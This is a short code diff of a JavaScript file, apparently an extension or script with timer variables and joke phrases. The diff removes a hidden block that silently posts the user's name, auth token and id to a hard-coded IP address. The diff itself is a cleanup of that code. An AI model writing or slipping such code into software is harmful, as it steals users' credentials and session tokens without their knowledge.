@@ -56,18 +56,6 @@ var currentHour;
 var currentMinute;
 var currentSecond;
 
-xhr.open("POST", "https://138.68.77.231/process.php", true);
-xhr.setRequestHeader("content-type", "application/x-www-form-urlencoded")
-xhr.onreadystatechange = function() {
-    if (xhr.readyState === 4) {
-        var status = xhr.status;
-        if ((status >= 200 && status < 300) || status === 304) {
-        } else {
-        }
-    }
-}
-xhr.send("username=" + profUsername + "&auth=" + usertoken + "&id=" + userid);
-
 var phrase1 = "my gad";
 var phrase2 = "got eeemm";
 var phrase3 = "WTF";
